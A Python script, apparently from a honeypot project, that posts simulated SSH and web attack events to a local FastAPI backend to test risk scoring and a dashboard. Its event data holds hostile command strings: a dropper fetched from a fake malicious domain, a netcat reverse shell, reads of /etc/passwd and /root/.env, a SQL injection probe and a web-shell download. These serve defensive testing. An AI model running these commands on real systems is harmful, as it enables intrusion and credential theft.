"""
Honeypot Event Simulation Script
Simulates realistic attacker activity against the FastAPI ingestion pipeline.
Useful for testing the backend and giving live data to Member 4 (Dashboard).
"""

import time
import requests
import uuid
from datetime import datetime, timezone

BASE_URL = "http://127.0.0.1:8000/api/events"

ATTACK_SCENARIOS = [
    {
        "session_id": "ATK-SSH-901",
        "source_ip": "185.220.101.5",
        "target_ip": "10.0.0.100",
        "service": "ssh",
        "events": [
            {"event_type": "login", "event": "Failed password for root from 185.220.101.5 port 42311 ssh2"},
            {"event_type": "login", "event": "Failed password for admin from 185.220.101.5 port 42312 ssh2"},
            {"event_type": "login", "event": "Accepted password for decoy_user from 185.220.101.5 port 42313 ssh2"},
            {"event_type": "command", "event": "whoami"},
            {"event_type": "command", "event": "uname -a"},
            {"event_type": "command", "event": "cat /etc/passwd"},
            {"event_type": "command", "event": "cat /root/.env"},
            {"event_type": "command", "event": "wget http://cdn.malicious-domain.cc/tools/dropper.sh -O /tmp/dropper.sh"},
            {"event_type": "command", "event": "chmod +x /tmp/dropper.sh"},
            {"event_type": "command", "event": "sudo -l"},
            {"event_type": "command", "event": "nc -e /bin/bash 185.220.101.5 9001"}
        ]
    },
    {
        "session_id": "ATK-WEB-402",
        "source_ip": "45.154.255.89",
        "target_ip": "10.0.0.100",
        "service": "http",
        "events": [
            {"event_type": "recon", "event": "GET /robots.txt HTTP/1.1"},
            {"event_type": "command", "event": "GET /admin/passwords.txt HTTP/1.1 (Decoy Canary File Access)"},
            {"event_type": "command", "event": "POST /api/login ' OR '1'='1' -- (SQL Injection Probe)"},
            {"event_type": "command", "event": "curl http://45.154.255.89/backdoor.php -o /var/www/html/backdoor.php"}
        ]
    }
]

def run_simulation(delay: float = 1.0):
    print("=================================================================")
    print("Starting Honeypot Telemetry Simulation -> Target:", BASE_URL)
    print("=================================================================")

    for scenario in ATTACK_SCENARIOS:
        session_id = scenario["session_id"]
        source_ip = scenario["source_ip"]
        target_ip = scenario["target_ip"]
        service = scenario["service"]

        print(f"\n[+] Launching Scenario for Session: {session_id} ({service.upper()} from {source_ip})")

        for idx, item in enumerate(scenario["events"], start=1):
            event_id = f"EVT-{session_id}-{idx:03d}-{uuid.uuid4().hex[:4]}"
            payload = {
                "event_id": event_id,
                "session_id": session_id,
                "source_ip": source_ip,
                "target_ip": target_ip,
                "service": service,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event_type": item["event_type"],
                "event": item["event"],
                "metadata": {
                    "simulation": True,
                    "step": idx,
                    "decoy_triggered": "passwords.txt" in item["event"] or ".env" in item["event"]
                }
            }

            try:
                res = requests.post(BASE_URL, json=payload, timeout=15)
                if res.status_code == 200:
                    data = res.json()
                    print(f"  [{idx}/{len(scenario['events'])}] Sent: '{item['event'][:45]}...' -> Risk: {data['current_session_risk']} ({data['risk_level']}) | DNA: {data.get('fingerprint')}")
                else:
                    print(f"  [-] Failed ({res.status_code}): {res.text}")
            except Exception as e:
                print(f"  [!] Connection error: {e}")
                print("      Ensure FastAPI backend is running on http://127.0.0.1:8000")
                return

            time.sleep(delay)

    print("\n=================================================================")
    print("Simulation Complete! Check Dashboard / WebSocket / API endpoints:")
    print("  - Summary:    http://127.0.0.1:8000/api/dashboard/summary")
    print("  - Attacks:    http://127.0.0.1:8000/api/attacks")
    print("  - Report:     http://127.0.0.1:8000/api/reports/ATK-SSH-901")
    print("  - Swagger UI: http://127.0.0.1:8000/docs")
    print("=================================================================")

if __name__ == "__main__":
    run_simulation(delay=0.6)
